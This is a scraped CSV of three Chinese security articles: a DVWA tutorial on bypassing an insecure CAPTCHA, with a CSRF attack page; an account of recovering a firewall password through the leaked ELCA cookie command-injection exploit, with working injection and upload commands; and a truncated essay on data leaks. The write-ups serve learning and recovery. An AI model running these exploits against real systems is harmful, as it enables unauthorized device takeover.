"5ccbfb484f2f0a0a7a69c145","DVWA（Damn Vulnerable Web Application）是一个用来进行安全脆弱性鉴定的PHP/MySQL Web应用，旨在为安全专业人员测试自己的专业技能和工具提供合法的环境，帮助web开发者更好的理解web应用安全防范的过程","kong","DVWA简介DVWA（Damn Vulnerable Web Application）是一个用来进行安全脆弱性鉴定的PHP/MySQL Web应用，旨在为安全专业人员测试自己的专业技能和工具提供合法的环境，帮助web开发者更好的理解web应用安全防范的过程。DVWA共有十个模块，分别是Brute Force（暴力（破解））Command Injection（命令行注入）CSRF（跨站请求伪造）File Inclusion（文件包含）File Upload（文件上传）Insecure CAPTCHA （不安全的验证码）SQL Injection（SQL注入）SQL Injection（Blind）（SQL盲注）XSS（Reflected）（反射型跨站脚本）XSS（Stored）（存储型跨站脚本）需要注意的是，DVWA 1.9的代码分为四种安全级别：Low，Medium，High，Impossible。初学者可以通过比较四种级别的代码，接触到一些PHP代码审计的内容。DVWA的搭建Freebuf上的这篇文章《新手指南：手把手教你如何搭建自己的渗透测试环境》（http://www.freebuf.com/sectool/102661.html）已经写得非常好了，在这里就不赘述了。之前模块的相关内容Brute ForceCommand InjectionCSRFFile InclusionFile Upload本文介绍Insecure CAPTCHA模块的相关内容，后续教程会在之后的文章中给出。Insecure CAPTCHAInsecure CAPTCHA，意思是不安全的验证码，CAPTCHA是Completely Automated Public Turing Test to Tell Computers and Humans Apart (全自动区分计算机和人类的图灵测试)的简称。但个人觉得，这一模块的内容叫做不安全的验证流程更妥当些，因为这块主要是验证流程出现了逻辑漏洞，谷歌的验证码表示不背这个锅。reCAPTCHA验证流程这一模块的验证码使用的是Google提供reCAPTCHA服务，下图是验证的具体流程。服务器通过调用recaptcha_check_answer函数检查用户输入的正确性。recaptcha_check_answer($privkey,$remoteip, $challenge,$response)参数$privkey是服务器申请的private key ，$remoteip是用户的ip，$challenge 是recaptcha_challenge_field 字段的值，来自前端页面 ，$response是 recaptcha_response_field 字段的值。函数返回ReCaptchaResponse class的实例，ReCaptchaResponse 类有2个属性 ：$is_valid是布尔型的，表示校验是否有效，$error是返回的错误代码。（ps:有人也许会问，那这个模块的实验是不是需要科学上网呢？答案是不用，因为我们可以绕过验证码）下面对四种级别的代码进行分析。Low服务器端核心代码：&lt;?php if( isset( $_POST[ 'Change' ] ) &amp;&amp; ( $_POST[ 'step' ] == '1' ) ) {     // Hide the CAPTCHA form     $hide_form = true;     // Get input     $pass_new  = $_POST[ 'password_new' ];     $pass_conf = $_POST[ 'password_conf' ];     // Check CAPTCHA from 3rd party     $resp = recaptcha_check_answer( $_DVWA[ 'recaptcha_private_key' ],         $_SERVER[ 'REMOTE_ADDR' ],         $_POST[ 'recaptcha_challenge_field' ],         $_POST[ 'recaptcha_response_field' ] );     // Did the CAPTCHA fail?     if( !$resp-&gt;is_valid ) {         // What happens when the CAPTCHA was entered incorrectly         $html     .= ""&lt;pre&gt;&lt;br /&gt;The CAPTCHA was incorrect. Please try again.&lt;/pre&gt;"";         $hide_form = false;         return;     }     else {         // CAPTCHA was correct. Do both new passwords match?         if( $pass_new == $pass_conf ) {             // Show next stage for the user             echo ""                 &lt;pre&gt;&lt;br /&gt;You passed the CAPTCHA! Click the button to confirm your changes.&lt;br /&gt;&lt;/pre&gt;                 &lt;form action=\""#\"" method=\""POST\""&gt;                     &lt;input type=\""hidden\"" name=\""step\"" value=\""2\"" /&gt;                     &lt;input type=\""hidden\"" name=\""password_new\"" value=\""{$pass_new}\"" /&gt;                     &lt;input type=\""hidden\"" name=\""password_conf\"" value=\""{$pass_conf}\"" /&gt;                     &lt;input type=\""submit\"" name=\""Change\"" value=\""Change\"" /&gt;                 &lt;/form&gt;"";         }         else {             // Both new passwords do not match.             $html     .= ""&lt;pre&gt;Both passwords must match.&lt;/pre&gt;"";             $hide_form = false;         }     } } if( isset( $_POST[ 'Change' ] ) &amp;&amp; ( $_POST[ 'step' ] == '2' ) ) {     // Hide the CAPTCHA form     $hide_form = true;     // Get input     $pass_new  = $_POST[ 'password_new' ];     $pass_conf = $_POST[ 'password_conf' ];     // Check to see if both password match     if( $pass_new == $pass_conf ) {         // They do!         $pass_new = mysql_real_escape_string( $pass_new );         $pass_new = md5( $pass_new );         // Update database         $insert = ""UPDATE `users` SET password = '$pass_new' WHERE user = '"" . dvwaCurrentUser() . ""';"";         $result = mysql_query( $insert ) or die( '&lt;pre&gt;' . mysql_error() . '&lt;/pre&gt;' );         // Feedback for the end user         echo ""&lt;pre&gt;Password Changed.&lt;/pre&gt;"";     }     else {         // Issue with the passwords matching         echo ""&lt;pre&gt;Passwords did not match.&lt;/pre&gt;"";         $hide_form = false;     }     mysql_close(); } ?&gt; 可以看到，服务器将改密操作分成了两步，第一步检查用户输入的验证码，验证通过后，服务器返回表单，第二步客户端提交post请求，服务器完成更改密码的操作。但是，这其中存在明显的逻辑漏洞，服务器仅仅通过检查Change、step        参数来判断用户是否已经输入了正确的验证码。    漏洞利用1.通过构造参数绕过验证过程的第一步首先输入密码，点击Change按钮，抓包：（ps:因为没有翻墙，所以没能成功显示验证码，发送的请求包中也就没有recaptcha_challenge_field、recaptcha_response_field两个参数）更改step参数绕过验证码：修改密码成功：2.由于没有任何的防CSRF机制，我们可以轻易地构造攻击页面，页面代码如下（详见CSRF模块的教程）。&lt;html&gt;      &lt;body onload=""document.getElementById('transfer').submit()""&gt;          &lt;div&gt;        &lt;form method=""POST"" id=""transfer"" action=""http://192.168.153.130/dvwa/vulnerabilities/captcha/""&gt;             &lt;input type=""hidden"" name=""password_new"" value=""password""&gt;        &lt;input type=""hidden"" name=""password_conf"" value=""password""&gt;             &lt;input type=""hidden"" name=""step"" value=""2""              &lt;input type=""hidden"" name=""Change"" value=""Change""&gt;            &lt;/form&gt;          &lt;/div&gt;        &lt;/body&gt;&lt;/html&gt;当受害者访问这个页面时，攻击脚本会伪造改密请求发送给服务器。美中不足的是，受害者会看到更改密码成功的界面（这是因为修改密码成功后，服务器会返回302，实现自动跳转），从而意识到自己遭到了攻击。Medium服务器端核心代码：&lt;?php if( isset( $_POST[ 'Change' ] ) &amp;&amp; ( $_POST[ 'step' ] == '1' ) ) {     // Hide the CAPTCHA form     $hide_form = true;     // Get input     $pass_new  = $_POST[ 'password_new' ];     $pass_conf = $_POST[ 'password_conf' ];     // Check CAPTCHA from 3rd party     $resp = recaptcha_check_answer( $_DVWA[ 'recaptcha_private_key' ],         $_SERVER[ 'REMOTE_ADDR' ],         $_POST[ 'recaptcha_challenge_field' ],         $_POST[ 'recaptcha_response_field' ] );     // Did the CAPTCHA fail?     if( !$resp-&gt;is_valid ) {         // What happens when the CAPTCHA was entered incorrectly         $html     .= ""&lt;pre&gt;&lt;br /&gt;The CAPTCHA was incorrect. Please try again.&lt;/pre&gt;"";         $hide_form = false;         return;     }     else {         // CAPTCHA was correct. Do both new passwords match?         if( $pass_new == $pass_conf ) {             // Show next stage for the user             echo ""                 &lt;pre&gt;&lt;br /&gt;You passed the CAPTCHA! Click the button to confirm your changes.&lt;br /&gt;&lt;/pre&gt;                 &lt;form action=\""#\"" method=\""POST\""&gt;                     &lt;input type=\""hidden\"" name=\""step\"" value=\""2\"" /&gt;                     &lt;input type=\""hidden\"" name=\""password_new\"" value=\""{$pass_new}\"" /&gt;                     &lt;input type=\""hidden\"" name=\""password_conf\"" value=\""{$pass_conf}\"" /&gt;                     &lt;input type=\""hidden\"" name=\""passed_captcha\"" value=\""true\"" /&gt;                     &lt;input type=\""submit\"" name=\""Change\"" value=\""Change\"" /&gt;                 &lt;/form&gt;"";         }         else {             // Both new passwords do not match.             $html     .= ""&lt;pre&gt;Both passwords must match.&lt;/pre&gt;"";             $hide_form = false;         }     } } if( isset( $_POST[ 'Change' ] ) &amp;&amp; ( $_POST[ 'step' ] == '2' ) ) {     // Hide the CAPTCHA form     $hide_form = true;     // Get input     $pass_new  = $_POST[ 'password_new' ];     $pass_conf = $_POST[ 'password_conf' ];     // Check to see if they did stage 1     if( !$_POST[ 'passed_captcha' ] ) {         $html     .= ""&lt;pre&gt;&lt;br /&gt;You have not passed the CAPTCHA.&lt;/pre&gt;"";         $hide_form = false;         return;     }     // Check to see if both password match     if( $pass_new == $pass_conf ) {         // They do!         $pass_new = mysql_real_escape_string( $pass_new );         $pass_new = md5( $pass_new );         // Update database         $insert = ""UPDATE `users` SET password = '$pass_new' WHERE user = '"" . dvwaCurrentUser() . ""';"";         $result = mysql_query( $insert ) or die( '&lt;pre&gt;' . mysql_error() . '&lt;/pre&gt;' );         // Feedback for the end user         echo ""&lt;pre&gt;Password Changed.&lt;/pre&gt;"";     }     else {         // Issue with the passwords matching         echo ""&lt;pre&gt;Passwords did not match.&lt;/pre&gt;"";         $hide_form = false;     }     mysql_close(); } ?&gt; 可以看到，Medium级别的代码在第二步验证时，参加了对参数passed_captcha的检查，如果参数值为true，则认为用户已经通过了验证码检查，然而用户依然可以通过伪造参数绕过验证，本质上来说，这与Low级别的验证没有任何区别。漏洞利用1.可以通过抓包，更改step参数，增加passed_captcha参数，绕过验证码。抓到的包：更改之后的包：更改密码成功：2.依然可以实施CSRF攻击，攻击页面代码如下。&lt;html&gt;       &lt;body onload=""document.getElementById('transfer').submit()""&gt;         &lt;div&gt;          &lt;form method=""POST"" id=""transfer"" action=""http://192.168.153.130/dvwa/vulnerabilities/captcha/""&gt;               &lt;input type=""hidden"" name=""password_new"" value=""password""&gt;        &lt;input type=""hidden"" name=""password_conf"" value=""password""&gt;                &lt;input type=""hidden"" name=""passed_captcha"" value=""true""&gt;                &lt;input type=""hidden"" name=""step"" value=""2""&gt;               &lt;input type=""hidden"" name=""Change"" value=""Change""&gt;            &lt;/form&gt;          &lt;/div&gt;&lt;/body&gt;        &lt;/html&gt;当受害者访问这个页面时，攻击脚本会伪造改密请求发送给服务器。不过依然会跳转到更改密码成功的界面。High服务器端核心代码：&lt;?php if( isset( $_POST[ 'Change' ] ) ) {     // Hide the CAPTCHA form     $hide_form = true;     // Get input     $pass_new  = $_POST[ 'password_new' ];     $pass_conf = $_POST[ 'password_conf' ];     // Check CAPTCHA from 3rd party     $resp = recaptcha_check_answer( $_DVWA[ 'recaptcha_private_key' ],         $_SERVER[ 'REMOTE_ADDR' ],         $_POST[ 'recaptcha_challenge_field' ],         $_POST[ 'recaptcha_response_field' ] );     // Did the CAPTCHA fail?     if( !$resp-&gt;is_valid &amp;&amp; ( $_POST[ 'recaptcha_response_field' ] != 'hidd3n_valu3' || $_SERVER[ 'HTTP_USER_AGENT' ] != 'reCAPTCHA' ) ) {         // What happens when the CAPTCHA was entered incorrectly         $html     .= ""&lt;pre&gt;&lt;br /&gt;The CAPTCHA was incorrect. Please try again.&lt;/pre&gt;"";         $hide_form = false;         return;     }     else {         // CAPTCHA was correct. Do both new passwords match?         if( $pass_new == $pass_conf ) {             $pass_new = mysql_real_escape_string( $pass_new );             $pass_new = md5( $pass_new );             // Update database             $insert = ""UPDATE `users` SET password = '$pass_new' WHERE user = '"" . dvwaCurrentUser() . ""' LIMIT 1;"";             $result = mysql_query( $insert ) or die( '&lt;pre&gt;' . mysql_error() . '&lt;/pre&gt;' );             // Feedback for user             echo ""&lt;pre&gt;Password Changed.&lt;/pre&gt;"";         }         else {             // Ops. Password mismatch             $html     .= ""&lt;pre&gt;Both passwords must match.&lt;/pre&gt;"";             $hide_form = false;         }     }     mysql_close(); } // Generate Anti-CSRF token generateSessionToken(); ?&gt; 可以看到，服务器的验证逻辑是当$resp（这里是指谷歌返回的验证结果）是false，并且参数recaptcha_response_field不等于hidd3n_valu3（或者http包头的User-Agent参数不等于reCAPTCHA）时，就认为验证码输入错误，反之则认为已经通过了验证码的检查。漏洞利用搞清楚了验证逻辑，剩下就是伪造绕过了，由于$resp参数我们无法控制，所以重心放在参数recaptcha_response_field、User-Agent上。第一步依旧是抓包：更改参数recaptcha_response_field以及http包头的User-Agent：密码修改成功：Impossible服务器端核心代码if( isset( $_POST[ 'Change' ] ) ) {     // Check Anti-CSRF token     checkToken( $_REQUEST[ 'user_token' ], $_SESSION[ 'session_token' ], 'index.php' );     // Hide the CAPTCHA form     $hide_form = true;     // Get input     $pass_new  = $_POST[ 'password_new' ];     $pass_new  = stripslashes( $pass_new );     $pass_new  = mysql_real_escape_string( $pass_new );     $pass_new  = md5( $pass_new );     $pass_conf = $_POST[ 'password_conf' ];     $pass_conf = stripslashes( $pass_conf );     $pass_conf = mysql_real_escape_string( $pass_conf );     $pass_conf = md5( $pass_conf );     $pass_curr = $_POST[ 'password_current' ];     $pass_curr = stripslashes( $pass_curr );     $pass_curr = mysql_real_escape_string( $pass_curr );     $pass_curr = md5( $pass_curr );     // Check CAPTCHA from 3rd party     $resp = recaptcha_check_answer( $_DVWA[ 'recaptcha_private_key' ],         $_SERVER[ 'REMOTE_ADDR' ],         $_POST[ 'recaptcha_challenge_field' ],         $_POST[ 'recaptcha_response_field' ] );     // Did the CAPTCHA fail?     if( !$resp-&gt;is_valid ) {         // What happens when the CAPTCHA was entered incorrectly         echo ""&lt;pre&gt;&lt;br /&gt;The CAPTCHA was incorrect. Please try again.&lt;/pre&gt;"";         $hide_form = false;         return;     }     else {         // Check that the current password is correct         $data = $db-&gt;prepare( 'SELECT password FROM users WHERE user = (:user) AND password = (:password) LIMIT 1;' );         $data-&gt;bindParam( ':user', dvwaCurrentUser(), PDO::PARAM_STR );         $data-&gt;bindParam( ':password', $pass_curr, PDO::PARAM_STR );         $data-&gt;execute();         // Do both new password match and was the current password correct?         if( ( $pass_new == $pass_conf) &amp;&amp; ( $data-&gt;rowCount() == 1 ) ) {             // Update the database             $data = $db-&gt;prepare( 'UPDATE users SET password = (:password) WHERE user = (:user);' );             $data-&gt;bindParam( ':password', $pass_new, PDO::PARAM_STR );             $data-&gt;bindParam( ':user', dvwaCurrentUser(), PDO::PARAM_STR );             $data-&gt;execute();             // Feedback for the end user - success!             echo ""&lt;pre&gt;Password Changed.&lt;/pre&gt;"";         }         else {             // Feedback for the end user - failed!             echo ""&lt;pre&gt;Either your current password is incorrect or the new passwords did not match.&lt;br /&gt;Please try again.&lt;/pre&gt;"";             $hide_form = false;         }     } } // Generate Anti-CSRF token generateSessionToken(); ?&gt; 可以看到，Impossible级别的代码增加了Anti-CSRF token 机制防御CSRF攻击，利用PDO技术防护sql注入，验证过程终于不再分成两部分了，验证码无法绕过，同时要求用户输入之前的密码，进一步加强了身份认证。","2016-11-23 10:11:28","Web安全","新手指南：DVWA-1.9全级别教程之Insecure CAPTCHA","http://nsoad.com/Article/web/20161123/836.html"
"5ccbfb484f2f0a0a7a69c146","公司在用的一款防火墙，密码意外遗失，无法登陆管理平台。虽然防火墙可以正常工作，但却无法修改配置，不能根增加和删除访问列表中的IP地址，不能调整访问策略。防火墙默认","Kong","公司在用的一款防火墙，密码意外遗失，无法登陆管理平台。虽然防火墙可以正常工作，但却无法修改配置，不能根增加和删除访问列表中的IP地址，不能调整访问策略。防火墙默认仅开通https web管理界面，未开启telnet、ssh等其他管理通道。联系厂家寻求技术支持，被告知必须返厂更换芯片，费用大约在2000元左右（网上搜了一下，几乎所有密码遗失的客户最终都只能选择返厂）。公司用于该网络联网的仅此一台防火墙设备，终端数量在500以上，无其他硬件备份方案。因用户众多，管理要求细致，防火墙配置非常复杂，保存的配置文件也不是最新的。若返厂维修的话，则无法找到完备的替代方案。于是决定先自己想办法，开启密码恢复之旅。Go！猜测密码，自动验证首先想到的是根据可能的密码规则和常用组合，构造一个密码字典，通过编写简单的Python脚本进行登录验证。万一不行的话，就穷举来尝试暴力破解。可是开始跑脚本的时候发现想法实在太天真了，存在两个致命的问题：防火墙白天负荷过重，Web响应非常慢。有时候一个请求可能在半分钟以上。Web管理平台有登录次数限制，大约6次密码错误以后，就会锁定账号一段时间。在尝试了几十个最可能出现的密码组合后，彻底放弃了这条捷径。看来偷懒是不成了，必须得动真格的。搜寻漏洞，获取控制权nmap扫描发现防火墙只开通了https端口。不是专业的安全研究人员，只能在网上搜索该款防火墙的漏洞资料，不(suo)幸的是，还真发现了不少。找到的第一篇文章 《看我如何在2小时内控制100+***安全设备的》 提到了Heartbleed漏洞，却未对漏洞利用方式做过多解释。需要更多学习资料，根据这个方向继续搜索，又找到了一些文章：NSA Equation Group泄露的*产品漏洞分析（一）天融信率先发布BASH爆出高危漏洞规则库***防火墙openssl漏洞可能导致信息泄漏***防火墙关于“方程式组织”漏洞处置公告其中，NSA Equation Group那篇文章信息量最高，对漏洞的特征和产生的原因分析的非常透彻，利用方式也做了简要说明。按照文章的提示，用Brup进行Eligible Candidate漏洞测试（打算用Postman，但因chrome的https证书问题放弃），漏洞果然还在！怀着激动的心情，尝试了 ls -la /&gt;/www/htdocs/1、 find / -type f&gt;/www/htdocs/1 等指令，对防火墙文件系统的目录结构进行初步了解，也看到了配置文件存放的位置。执行 cp /tos/conf/config&gt;/www/htdocs/1，把配置文件down下来一看，果然是新鲜的味道。启动telnetd服务并尝试连接，报错，估计是没有加特定启动参数的缘故，没做深入研究。看来暂时还是只能通过https漏洞方式跑命令了。随着执行命令次数越来越多，Brup构造请求的方式效率太低，于是写了简单的Python函数在IPython下面跑，终觉得灵活性不够。最后决定采用HTTPie命令行的方式发送https请求（curl没有httpie方便），后续所有命令都通过这种方式交互。$ http --verify=no https://x.x.x.x/cgi/maincgi.cgi 'Cookie: session_id=x`ls -la /tmp&gt;/www/htdocs/1`'文件上传，执行脚本文件之前都是一次请求执行一条命令，效率太低，也存在诸多限制。最好的方式是上传一个sh脚本在防火墙上执行，这就需要以某种方式传送文件到防火墙上去。另一方面，根据漏洞名称和Equation Group搜索到这篇文章：Equation Group泄露文件分析，才注意到这是国际顶尖黑客组织，也是NSA合作的方程式黑客组织（Equation Group），被另一个名为“The ShadowBrokers”的黑客组织攻下了，珍藏的系列高级工具被打包分享。这可是个好东西！赶紧下载解密，找到ELCA的漏洞利用代码，运行后却发现没有如逾期般的启动nopen远程管理软件，原因未知，颇有些失望。不过在py源码中看到了文件上传的方式，其实就是利用了cgi文件上传处理方式，它每次会在/tmp目录下生成一个cgi*的临时文件。ELCA利用代码的流程是连续执行多次指令，第一次 rm /tmp/cgi*清理tmp目录，接着post上传文件同时复制保存一份cp /t*/cg* /tmp/.a，再加执行权限 chmod +x /tmp/.a，最后执行 /tmp/.a。当然，代码并没有直接上传一个可执行文件，而是巧妙（恕见识少，我知道*nix下经常这样干）的将需要的多个文件用tar打包后，附到sh脚本的最后。在sh脚本中用dd命令将tar包copy出来再解压运行。下面是工具中stage.sh的部分代码：文件tar打包的Python代码片段：http --verify=no -b -f POST https://x.x.x.x/cgi/maincgi.cgi 'Cookie: session_id=x`sh /t*/cg*`' a@test.sh; http --verify=no https://x.x.x.x/1  HTTPie可以用 uploadfilename@localfilename 的方式很方便的实现文件上传。之所以两条指令在一行是为了方便查看前一个脚本的输出。#!/bin/sh# 清除/tmp/cgi*，防止干扰下次运行rm -f /t*/cgi*echo =============================== &gt;/www/htdocs/1  date &gt;&gt;/www/htdocs/1echo ""***************"" &gt;&gt;/www/htdocs/1  cd /tmp  ps &gt;&gt;/www/htdocs/1  netstat -nltp &gt;&gt;/www/htdocs/1  ls -la /tos/etc /data/auth/db /tmp &gt;&gt;/www/htdocs/1  上面的示例脚本就可以一次进行多种操作，获取进程信息、网络连接情况、目录文件等多种信息，大幅减少交互次数提高效率。逆向分析，寻找密码做了很多准备工作，找到了比较便捷的脚本执行方式。而且根据ps结果来看，指令是以root权限运行的。接下来要开始干正事了，tar cf /home/htdocs/1 / 打包文件系统，down下来准备逆向分析。因为web登录入口指向maincgi.cgi，就从它开始。逆向分析的过程相当繁杂、漫长、枯燥乏味，具有相当的挑战性，所以需要坚定的毅力和不时涌现的灵感。无数次调整思路和方向，无数次寻找新的突破口。我现在也记不清当初分析时的前因后果，就把一些分析的结果整理下，做一个简单的分享。入口 maincgi.cgimaincgi.cgi 位于 /www/cgi/ 目录下。用IDA进行逆向分析。根据登录form提交的 username 和 passwd 在string窗口搜索，x跟踪调用情况分析，最终来到 000403D4 函数内。下面是更容易理解的C伪代码（我开始分析的时候没找到可用的hexrays，这是事后撰写此文时找到的。:-( 工欲善其事必先利其器啊！）：可以看到，username和passwd参数都原封不动的传入到login函数，想必沿着这个方向一定能找到密码保存的地方。跟进发现login是import函数，不在maincgi.cgi中实现。为了方便，我把lib和so目录下所有文件的符号表都进行了分析，结果保存在一个文件中备查。$ nm -D tos/lib/* tos/so/* &gt; symbols.txt很快发现 login 函数在 /tos/so/libwebui_tools.so 中实现。入了RPC的坑本以为找到 libwebui_tools.so 中的login实现，一切皆可水落石出。谁料还是 too young, too naive。根据export表很快定位到login函数的实现，开始是TLS连接127.0.0.1：4000，接着是一堆错误处理代码。其中有一个 guisendreqx 函数的调用参数 CFG_AUTH 引起了我的注意，猜测是一种自定义的类RPC实现。唉，还是C伪代码看得清楚啊！再次哭晕在厕所 :-(既然不是通过本地.so调用，那只有知道到底是谁提供了这个rpc服务，才能找到接下来的路。好用的netstat好在我们有执行代码的权限，好在防火墙里面有netstat命令。执行 netstat -nltp &gt;&gt;/www/htdocs/1 得到下面的结果：一目了然。原来服务是 tos_configd 提供的呀！被ELCA漏洞利用脚本误导了，以为是只是一个命令行shell，之前跟过，但没有细看。这不，还是要回头找它。百转千回tos_configd 分析过程并非一帆风顺。根据RPC传递的参数CFG_AUTH作为线索进行追踪，看到RPC支持多个命令。当命令为CFG_AUTH时，将数字5写到参数传入的内存区域某个变量中。没有其他更多的信息，看来只能根据caller向上一步步追了。代码回到rpc的消息处理thread中，经过逐步分析，定位到消息处理函数中。跟进去，可以看到大致的处理流程。有一个switch过程，case 5后面就是CFG_AUTH的处理代码。5就是前面第一个过程中设置的变量。topsec_manager_auth函数用于接管用户密码鉴权工作，它是一个import函数，按照前面的方法查到它在 /tos/so/libmanager.so 中实现。胜利的曙光libmanager的export表非常简练，似乎每一个都让人颇感兴趣。先看看我们的目标函数topsecmanagerauth：信息量很大，到这里基本上就看到了胜利的曙光。首先看到的是用户名+密码的MD5，然后传入到 j_match_manager_name 函数中进行校验。这不就是经典的用户名密码校验过程嘛（未加salt）。需要说明一下的是，上图中看到的username参数名称是我综合各类分析得知内容后改名的，并不是想当然，更不是IDA智能更名。username+32是密码明文，这也是在前面的分析过程中得出的结论。跟进match_manager_name函数，并没有立即发现直观的密码文件读取过程。取而代之的是，内存中存在最多500个struct，其中包含了用户名和MD5值，鉴权过程就是与其一一进行匹配比对。Local_db_dev_node是一个全局buffer，搞清楚它的数据来源就找到根源了。按X查看Localdbdev_node的reference，还真不少。第一个read_dev_manager_file就很像，跟进去看一下。Bingo！就是它了！ /tos/etc/Tosdevmanager_info 其实这个文件之前也注意到，不过没曾想它居然保存了鉴权信息，而且是用户名密码拼接MD5这么简单！用hexdump查看之前下载的Tosdevmanagerinfo进行验证，大小104字节，与分析得到的struct大小完全一致。再看用户名和密码的位置，和分析Localdbdevnode结构完全一致。清除最后的障碍终于找到密码保存到文件了，三下五除二，自己设定一个密码，计算MD5值，修改Tos_dev_manager_info对应的区域。文件上传，覆盖，重启，等结果……import hashlib  print(hashlib.md5('superman' + '111111').hexdigest())  几分钟后，设备起来了，赶紧试一下密码，错误！！！郁闷，怎么会呢？down下/tos/etc/Tosdevmanager_info一看，还是老数据。看来是工作还没到位。想起 libmanager 不是有那么多可疑的函数吗？挑感兴趣的进去看看，比如write_memdata2flash：对，就它了。一般网络设备修改配置以后，不都还来一个 wr mem 吗？估计 /data/auth/db/ 才是最终保存数据的地方，/tos/etc可能重启的时候会重新copy覆盖。再重新上传一次修改好的Tosdevmanager_info文件，只不过这次同时覆盖了几个目录下的文件。重启，用设定的密码登录，搞定！！！走过的弯路当然，我分析过的文件远不止上面这些，也不是按照本文的思路一步一步走下来，走了不少弯路。凭感觉，或为了寻找新线索，或漫无目的地毯式搜索。除了上面列举的部分之外，还分析过其他几个.so文件，跟踪过上百个函数，多数与我需要的东西关系并不太大。逆向分析就是这样，不可能一帆风顺，也没有既定的方法和思路。就是要有一种执着的精神，在不断的尝试、纠错和总结过程中达到目的地。成功后那一刻豁然开朗的成就感一直是我所痴迷的。关于MD5破解不得不说的事既然知道了算法，也有了MD5数据，是不是可以真正的找回当初的密码呢？和第一步猜测密码类似，用python按照一定规则，生成可能的密码序列。调用 hashlib.md5() 计算hash值与目标进行比对，结果跑了一天没结果。想着这种计算密集型的程序，在python和c之间切换太频繁可能影响效率。又在网上找到一个 Fast MD5 hash implementation in x86 assembly 汇编实现的快速算法，并且根据实际需求做了一定的优化。运行，依然无结果。不甘心，再到网上搜索资料，发现人家都用GPU跑字典。好吧，我也找来一个 Hashcat，在 i5 8G内存 的iMac 上试跑，的确速度非常快。然而，由于密码长，计算量过大，最终也没跑出结果，就此作罢。现在想想，如果没有密码长度、规则等任何信息的话，光凭暴力破解一个非典型密码，几乎是 Mission Impossible。搞定，收工很久没写过长文，也没发过技术类文章。上一次可能要追溯到2001年8月的时候，曾以打鸡血似的饱满激情写过一篇软件逆向习作。此次防火墙密码成功恢复，其漏洞功不可没。对我而言，又重温了一把当初年少时对技术的执着。最后，小结一下：软件逆向分析是个体力活。工欲善其事必先利其器。安全问题无时无刻不在。","2016-10-20 02:05:48","网络安全","天融信防火墙密码恢复手记","http://nsoad.com/Article/Network-security/20161020/609.html"
"5ccbfb524f2f0a0a7a69c147","一、引言现代社会，生活离不开大数据。大数据可以让你生活更加方便，例如可以推荐你什么时候应该走什么路才能更快，在什么餐厅吃饭又便宜又好吃，及时给你推送你想要的物品","Kong","一、引言现代社会，生活离不开大数据。大数据可以让你生活更加方便，例如可以推荐你什么时候应该走什么路才能更快，在什么餐厅吃饭又便宜又好吃，及时给你推送你想要的物品等等。这些数据不仅某府想要，黑客更想要。二、数据的类型最主要的有以下几点：1.医疗数据2.电商数据3.社交数据4.股票数据三、隐私的定义隐私（privacy）是什么？指什么方面的？怎么去定义什么是自己的隐私？有以下几点：1．与个体相关例如一个人的生活，他的私密房子，他的小三【这个不知道算不算，哈哈。狗仔队偷拍到他的生活，就是侵犯了他的隐私。 2．与信息相关密码，生日，身份证号，照片等等等等，这种最常见的3．与观测对象相关（隐私信息的获得者）例如，一个很熟的朋友给你发了一张X照，那这个是她的隐私吗？对你算是隐私吗？对别人算是隐私吗？答案是这个是她的隐私，但是对你来说不算，对他人来说算，她给你看不代表给你公布。四、隐私的获取不知道大家看没看过最近的新闻，之前在杭州试运营的“城市大脑”它通过捕获这个城市的市民出行情况。通过什么方式出行，在什么时候的什么地方人最多，市民的脸部，每天乘公交车的次数，什么时候的什么公交车人数最多，公交车在多久会到下一站，在什么地点打的人数最多等等数据来做成一个大脑。通过人工智能对大数据的分析来管制路段，疏通路段，派出的士，派出公交车，改善红绿灯时间，自动调配公共资源来缓解交通拥堵，景区拥堵。【题外话：这个是zf的隐私获取，当然我们无权干涉。。电商和医疗数据大家都知道，比如每天买的东西，在什么地方看了病，容易生什么病，初生儿的登记，通过各大医院，各大电商来做的大数据。五、大数据的泄露回归正题，前面我们讲了隐私和收集的数据，那作为黑客，最想获得什么数据呢？我们来盘点下16年国内泄露的一些数据：网曝学信网数据泄露网上曝出学信网(中国高等教育学生信息网)遭到黑客攻击，大量数据被泄露”的消息，引发众多网友关注。今天下午，法晚记者向教育部发言人续梅求证，续梅就此回应称：学信网已经注意到相关信息，并且进行了认真排查，目前没有发现数据泄露问题。【到底有没有泄露也不知道，新闻肯定要给大众好印象的20 万儿童信息被打包出售，信息精确到家庭门牌号当记者表示想要购买济南市槐荫区和市中区1-5岁的婴幼儿信息时，对方表示济南市全市的1-5岁的婴幼儿信息手头上有20多万条，打包价32000元。如果只要这两个区的，总数大约有80000条，最低价21000元。除了姓名和联系方式，这些信息甚至能精确到门牌号，平均每条信息几毛钱，被打包贩卖。。小米MIUI合作版ROM存篡权漏洞，可任意获取重要数据小米官网所有MIUI合作版ROM均存在系统权限漏洞，任意APK都可利用此漏洞篡夺与ROM厂商相同的权限和数据，从而窃取系统应用数据(如短信、通讯录、照片等)、窃取小米账号密码(危及小米钱包和云端备份的资料)、执行静默安装，甚至OTA升级系统，为所欲为。257万条公民银行个人信息被泄露 银行行长卖账号10月14日，成都商报记者从绵阳市公安局网络安全保卫支队获悉，绵阳警方最近破获公安部挂牌督办的“5·26侵犯公民个人信息案”，抓获包括银行管理层在内的犯罪团伙骨干分子15人、查获公民银行个人信息257万条、涉案资金230万元，成功打掉了侵犯公民个人隐私的这一黑色产业链。湖南一银行支行行长出售自己的查询账号给中间商，再由中间商将账号卖给有银行关系的“出单渠道”团伙，再由另外一家银行的员工进入内网系统，大肆窃取个人信息贩卖获利。还有一些漏洞作为参考：从今年的一些安全新闻来看，黑客最需要的还是医疗，电商和金融这种能为黑客获得利益的。（因为某云被查表了，导致没有多少可以参考的数据，某天的数据是不公开的，更难做参考了）六、大数据泄漏的成本我们先看一个表。我们看到，医疗的数据在355美元一条，企业的一些措施可以降低数据泄露的成本，例如事件响应团队、广泛应用加密、员工培训、参与威胁共享体系或业务持续性管理均有助于降低数据泄露时每条记录平均成本。而第三方参与、大规模云迁移、紧急通知或设备丢失/被盗所引发的数据泄露则会增加泄露的平均成本。近两年频繁爆发的数据泄露事件给企业和用户带来了重大的经济损失和不良声誉影响，除了在事后消除影响的成本投入外，在数据泄露事件发生之前如果能对数据泄露大致成本有明确清晰的认识，也会对企业高层做出更合理的预防和应对措施有所帮助。所以很多在黑产卖的还是医疗数据和电商的多，毕竟可以用于诈骗嘛。还能让企业亏损很多。七、为什么会导致怎么多的数据泄露？主要有一下几点：1.隐私信息泄露方式复杂和隐蔽2.隐私信息传播快，难控制3.隐私数据的管理缺乏规范和监管4.安全系统漏洞，黑客入侵有些时候企业还没发现信息泄漏的时